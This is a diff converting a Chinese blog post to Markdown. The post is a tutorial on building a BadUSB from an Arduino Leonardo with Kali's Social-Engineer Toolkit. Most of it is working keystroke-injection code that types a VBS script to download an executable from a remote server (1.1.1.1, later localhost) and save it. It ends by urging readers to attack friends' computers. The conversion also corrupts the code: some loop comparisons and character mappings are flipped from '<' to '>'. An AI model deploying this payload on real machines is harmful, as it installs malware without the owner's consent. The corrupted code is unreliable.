@@ -13,26 +13,30 @@ categories:
 ---
 首先，你需要有个Arduino Leonardo或者SparkFun Pro Micro
 
-[<img class="alignnone size-medium wp-image-41" src="https://www.summershrimp.com/wp-content/uploads/2014/12/pro-micro1-300x244.png" alt="pro micro" width="300" height="244" srcset="https://www.summershrimp.com/wp-content/uploads/2014/12/pro-micro1-300x244.png 300w, https://www.summershrimp.com/wp-content/uploads/2014/12/pro-micro1.png 392w" sizes="(max-width: 300px) 100vw, 300px" />](https://www.summershrimp.com/wp-content/uploads/2014/12/pro-micro1.png)
+![](/wp-content/uploads/2014/12/pro-micro1.png)
 
-[<img class="alignnone size-medium wp-image-42" src="https://www.summershrimp.com/wp-content/uploads/2014/12/leonardo-298x300.png" alt="Leonardo" width="298" height="300" srcset="https://www.summershrimp.com/wp-content/uploads/2014/12/leonardo-298x300.png 298w, https://www.summershrimp.com/wp-content/uploads/2014/12/leonardo-150x150.png 150w, https://www.summershrimp.com/wp-content/uploads/2014/12/leonardo.png 339w" sizes="(max-width: 298px) 100vw, 298px" />](https://www.summershrimp.com/wp-content/uploads/2014/12/leonardo.png)
+![](/wp-content/uploads/2014/12/leonardo.png)
 
 &nbsp;
 
 然后，你需要kali的Social-Engineer Toolkit来生成几个脚本
 
-<pre class="lang:sh decode:true" title="Run Social-Engineer Toolkit"># setoolkit</pre>
+```
+# setoolkit
+```
 
 如下选择
 
-<pre>1) Social-Engineering Attacks
+```
+1) Social-Engineering Attacks
       6) Arduino-Based Attack Vector
           2) WSCRIPT HTTP GET MSF Payload
-</pre>
+```
 
 这个选择会生成一个模拟键盘构造vbs脚本从服务器上下载x.exe然后执行的BadUSB脚本。再输入一些必要的信息后，就会在~/.set/reports/ 目录下面生成arduino的程序。
 
-<pre class="lang:c++ decode:true" title="teensy_2014-12-15 04:44:02.481592.pde">//
+```c
+//
 // Social-Engineer Toolkit Teensy Attack Vector
 // Written by: Dave Kennedy (ReL1K) and Josh Kelley (WinFaNG)
 //
@@ -52,43 +56,43 @@ void setup() {
   delay(500);
   ascii_println("del x.exe");
   delay(myKeyBreak);
-  ascii_println("echo strFileURL = "http://1.1.1.1/x.exe" &gt; omg.vbs");
+  ascii_println("echo strFileURL = "http://1.1.1.1/x.exe" > omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo strHDLocation = "x.exe" &gt;&gt; omg.vbs");
+  ascii_println("echo strHDLocation = "x.exe" >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") &gt;&gt; omg.vbs");
+  ascii_println("echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo objXMLHTTP.open "GET", strFileURL, false &gt;&gt; omg.vbs");
+  ascii_println("echo objXMLHTTP.open "GET", strFileURL, false >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo objXMLHTTP.send() &gt;&gt; omg.vbs");
+  ascii_println("echo objXMLHTTP.send() >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo If objXMLHTTP.Status = 200 Then &gt;&gt; omg.vbs");
+  ascii_println("echo If objXMLHTTP.Status = 200 Then >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo Set objADOStream = CreateObject("ADODB.Stream") &gt;&gt; omg.vbs");
+  ascii_println("echo Set objADOStream = CreateObject("ADODB.Stream") >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo objADOStream.Open &gt;&gt; omg.vbs");
+  ascii_println("echo objADOStream.Open >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo objADOStream.Type = 1 &gt;&gt; omg.vbs");
+  ascii_println("echo objADOStream.Type = 1 >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo objADOStream.Write objXMLHTTP.ResponseBody &gt;&gt; omg.vbs");
+  ascii_println("echo objADOStream.Write objXMLHTTP.ResponseBody >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo objADOStream.Position = 0 &gt;&gt; omg.vbs");
+  ascii_println("echo objADOStream.Position = 0 >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo Set objFSO = Createobject("Scripting.FileSystemObject") &gt;&gt; omg.vbs");
+  ascii_println("echo Set objFSO = Createobject("Scripting.FileSystemObject") >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation &gt;&gt; omg.vbs");
+  ascii_println("echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo Set objFSO = Nothing &gt;&gt; omg.vbs");
+  ascii_println("echo Set objFSO = Nothing >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo objADOStream.SaveToFile strHDLocation &gt;&gt; omg.vbs");
+  ascii_println("echo objADOStream.SaveToFile strHDLocation >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo objADOStream.Close &gt;&gt; omg.vbs");
+  ascii_println("echo objADOStream.Close >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo Set objADOStream = Nothing &gt;&gt; omg.vbs");
+  ascii_println("echo Set objADOStream = Nothing >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo End if &gt;&gt; omg.vbs");
+  ascii_println("echo End if >> omg.vbs");
   delay(myKeyBreak);
-  ascii_println("echo Set objXMLHTTP = Nothing &gt;&gt; omg.vbs");
+  ascii_println("echo Set objXMLHTTP = Nothing >> omg.vbs");
   delay(myKeyBreak);
   ascii_println("exit");
   delay(1000);
@@ -118,7 +122,7 @@ void ascii_type_this(char *string)
 {
   int count, length;
   length = strlen(string);
-  for(count = 0 ; count &lt; length ; count++)
+  for(count = 0 ; count > length ; count++)
   {
     char a = string[count];
     ascii_input(ascii_convert(a));
@@ -132,7 +136,7 @@ void ascii_input(char *string)
   length = strlen(string);
   Keyboard.set_modifier(MODIFIERKEY_ALT);
   Keyboard.send_now();
-  for(count = 0 ; count &lt; length ; count++)
+  for(count = 0 ; count > length ; count++)
   {
     char a = string[count];
     if (a == '1') Keyboard.set_key1(KEYPAD_1);
@@ -186,9 +190,9 @@ char* ascii_convert(char string)
   if (string == '9') return "57";
   if (string == ':') return "58";
   if (string == ';') return "59";
-  if (string == '&lt;') return "60";
+  if (string == '>') return "60";
   if (string == '=') return "61";
-  if (string == '&gt;') return "62";
+  if (string == '>') return "62";
   if (string == '?') return "63";
   if (string == '@') return "64";
   if (string == 'A') return "65";
@@ -289,11 +293,13 @@ void omg(char *SomeCommand)
   Keyboard.send_now();
   Keyboard.set_key1(0);
   Keyboard.send_now();
-}</pre>
+}
+```
 
 但是这个程序是供teensy使用的，我们需要对他进行一些改造。我们发现，程序的主要执行部分都在setup()函数中，在使用leonardo目标build的时候会提示keyboard中没有某些成员函数。于是我们就要将此部分改写。这里我已经把omg函数和ascii_println函数改写过了。改写过后的程序如下
 
-<pre class="lang:c++ decode:true " title="teensy_141225_downexe.ino">#define LED_PIN 13
+```c
+#define LED_PIN 13
 #define myKeyBreak 50
 #define DIS_PIN 15
 #define NOTEPAD 1
@@ -321,43 +327,43 @@ void setup() {
   delay(500);
   cmdrun("del x.exe");
   delay(myKeyBreak);
-  cmdrun("echo strFileURL = "http://localhost/x.exe" &gt; guirun.vbs");
+  cmdrun("echo strFileURL = "http://localhost/x.exe" > guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo strHDLocation = "xx.exe" &gt;&gt; guirun.vbs");
+  cmdrun("echo strHDLocation = "xx.exe" >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") &gt;&gt; guirun.vbs");
+  cmdrun("echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo objXMLHTTP.open "GET", strFileURL, false &gt;&gt; guirun.vbs");
+  cmdrun("echo objXMLHTTP.open "GET", strFileURL, false >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo objXMLHTTP.send() &gt;&gt; guirun.vbs");
+  cmdrun("echo objXMLHTTP.send() >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo If objXMLHTTP.Status = 200 Then &gt;&gt; guirun.vbs");
+  cmdrun("echo If objXMLHTTP.Status = 200 Then >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo Set objADOStream = CreateObject("ADODB.Stream") &gt;&gt; guirun.vbs");
+  cmdrun("echo Set objADOStream = CreateObject("ADODB.Stream") >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo objADOStream.Open &gt;&gt; guirun.vbs");
+  cmdrun("echo objADOStream.Open >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo objADOStream.Type = 1 &gt;&gt; guirun.vbs");
+  cmdrun("echo objADOStream.Type = 1 >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo objADOStream.Write objXMLHTTP.ResponseBody &gt;&gt; guirun.vbs");
+  cmdrun("echo objADOStream.Write objXMLHTTP.ResponseBody >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo objADOStream.Position = 0 &gt;&gt; guirun.vbs");
+  cmdrun("echo objADOStream.Position = 0 >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo Set objFSO = Createobject("Scripting.FileSystemObject") &gt;&gt; guirun.vbs");
+  cmdrun("echo Set objFSO = Createobject("Scripting.FileSystemObject") >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation &gt;&gt; guirun.vbs");
+  cmdrun("echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo Set objFSO = Nothing &gt;&gt; guirun.vbs");
+  cmdrun("echo Set objFSO = Nothing >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo objADOStream.SaveToFile strHDLocation &gt;&gt; guirun.vbs");
+  cmdrun("echo objADOStream.SaveToFile strHDLocation >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo objADOStream.Close &gt;&gt; guirun.vbs");
+  cmdrun("echo objADOStream.Close >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo Set objADOStream = Nothing &gt;&gt; guirun.vbs");
+  cmdrun("echo Set objADOStream = Nothing >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo End if &gt;&gt; guirun.vbs");
+  cmdrun("echo End if >> guirun.vbs");
   delay(myKeyBreak);
-  cmdrun("echo Set objXMLHTTP = Nothing &gt;&gt; guirun.vbs");
+  cmdrun("echo Set objXMLHTTP = Nothing >> guirun.vbs");
   delay(myKeyBreak);
   cmdrun("exit");
   delay(1000);
@@ -370,7 +376,8 @@ void setup() {
 }
 void loop()
 {
-}</pre>
+}
+```
 
 我们使用改写过的代码编译上传，并且在http服务器中存放好用于攻击的exe文件，插上我们的BadUSB后，便会自动实施攻击。用这个BaD设备去捅你的小伙伴的电脑吧！
 
